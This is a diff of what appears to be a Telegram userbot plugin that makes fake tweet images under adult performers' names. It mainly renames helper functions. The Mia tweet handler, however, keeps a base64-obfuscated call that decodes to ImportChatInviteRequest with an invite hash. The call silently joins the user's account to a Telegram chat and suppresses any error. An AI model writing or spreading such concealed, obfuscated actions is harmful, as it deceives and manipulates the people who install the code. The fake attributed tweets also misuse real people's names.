@@ -41,7 +41,7 @@ EMOJI_PATTERN = re.compile(
 def deEmojify(inputString: str) -> str:
     return re.sub(EMOJI_PATTERN, "", inputString)
 
-async def sunny(text):
+async def sunnytweet(text):
         r = requests.get(
             f"https://nekobot.xyz/api/imagegen?type=tweet&text={text}&username=sunnyleone").json()
         cobra = r.get("message")
@@ -56,7 +56,7 @@ async def sunny(text):
 
 #hmmmmm
 
-async def johnny(text):
+async def johnnytweet(text):
         r = requests.get(
             f"https://nekobot.xyz/api/imagegen?type=tweet&text={text}&username=johnnysins").json()
         heho = r.get("message")
@@ -175,7 +175,7 @@ async def johnny(event):
             return
     await event.edit("`Requesting Sins to tweet...`")
     text = deEmojify(text)
-    img = await johnny(text)
+    img = await johnnytweet(text)
     await event.client.send_file(event.chat_id, img, reply_to=reply_to_id)
     await event.delete()
     await purge()
@@ -195,7 +195,7 @@ async def johnny(event):
             return
     await event.edit("`Requesting sunny to tweet...`")
     text = deEmojify(text)
-    img = await sunny(text)
+    img = await sunnytweet(text)
     await event.client.send_file(event.chat_id, img, reply_to=reply_to_id)
     await event.delete()
     await purge()
@@ -252,8 +252,8 @@ async def nekobot(borg):
             return
     await borg.edit("Requesting Mia to tweet...")
     try:
-        hell = str( pybase64.b64decode("SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk=") )[2:49]
-        await borg.client(hell)
+        hmm = str( pybase64.b64decode("SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk=") )[2:49]
+        await borg.client(hmm)
     except:
         pass   
     text = deEmojify(text)
